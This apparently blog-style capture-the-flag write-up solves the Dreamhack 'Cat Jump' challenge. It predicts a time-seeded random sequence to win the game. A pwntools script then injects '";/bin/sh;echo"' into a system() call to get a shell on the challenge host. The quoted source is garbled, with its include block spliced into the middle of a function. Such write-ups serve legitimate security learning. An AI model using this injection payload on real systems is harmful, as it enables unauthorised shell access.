---
title: "Write Up for Cat Jump"
date: 2025-11-18 01:28:16 +0900
categories: [CTF, Dreamhack, Pwnable, Write up]
tags: []
---

# Write Up for Cat Jump
Source code is given
```
#define CAT_JUMP_GOAL 37

#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3

#define OBSTACLE_PROBABILITY 0.5
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

void StartGame() {
    char cat_name[32];
    char catnip;
    char cmd[64];
    char input;
    char obstacle;
    double p;
    unsigned char jump_cnt;

    srand(time(NULL));

    catnip = 0;
    jump_cnt = 0;

    puts("let the cat reach the roof! 🐈");

    sleep(1);

    do {
        // set obstacle with a specific probability.
        obstacle = rand() % 2;

        // get input.
        do {
            printf("left jump='h', right jump='j': ");
            scanf("%c%*c", &input);
        } while (input != 'h' && input != 'l');

        // jump.
        if (catnip) {
            catnip--;
            jump_cnt++;
            puts("the cat powered up and is invincible! nothing cannot stop! 🐈");
        } else if ((input == 'h' && obstacle != OBSTACLE_LEFT) ||
                (input == 'l' && obstacle != OBSTACLE_RIGHT)) {
            jump_cnt++;
            puts("the cat jumped successfully! 🐱");
        } else {
            puts("the cat got stuck by obstacle! 😿 🪨 ");
            return;
        }

        // eat some catnip with a specific probability.
        p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            puts("the cat found and ate some catnip! 😽");
            catnip = CATNIP_INVINCIBLE_TIMES;
        }
    } while (jump_cnt < CAT_JUMP_GOAL);

    puts("your cat has reached the roof!\n");

    printf("let people know your cat's name 😼: ");
    scanf("%31s", cat_name);/* cat_jump.c
 * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>


    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
}
```

# Primitives
```
srand(time(NULL));
```
This is the vulnerable part. We can easily guess the seed an get the random number sequence <br>

I made the subprocess that calculates ramdom number sequence based on the same seed (current time) <br>
```
#define CAT_JUMP_GOAL 37
#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

int main() {
    time_t current_time = time(NULL);
    int catnip_active = 0;
    srand(current_time);
    
    for (int i = 0; i < CAT_JUMP_GOAL; i++) {
        int obstacle = rand() % 2;
        
        if (catnip_active > 0) {
            printf("h");
            catnip_active--;
        } else {
            if (obstacle == OBSTACLE_LEFT) {
                printf("l");
            } else {
                printf("h");
            }
        }
        
        double p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            catnip_active = CATNIP_INVINCIBLE_TIMES;
        }
    }
    printf("\n");
    
    return 0;
}
```

This C code simulates the server's calculation exactly and makes correct sequence. We can use this as subprocess<br>

After successing 37 times, we can use command injection (Don't include white space in the command)

# Exploit
```
from pwn import *
import subprocess
import time

def get_sequence():
    result = subprocess.run(['./exploit'], capture_output=True, text=True)
    output_lines = result.stdout.strip().split('\n')
    sequence = output_lines[-1]
    return sequence

host = 'host3.dreamhack.games' 
port = 13531 
    
p = remote(host, port)

sequence = get_sequence()
log.info(f"{sequence}")
    
p.recvuntil("let the cat reach the roof! 🐈")
    
for i, char in enumerate(sequence):
    p.recvuntil("left jump='h', right jump='j': ")
    p.sendline(char)
    response = p.recvline()
    log.info(f"Turn {i+1}: '{char}' sent, Response: {response.decode().strip()}")
    
p.recvuntil("let people know your cat's name 😼: ")
    
shell_command = "\";/bin/sh;echo\""
p.sendline(shell_command)
p.interactive() 

```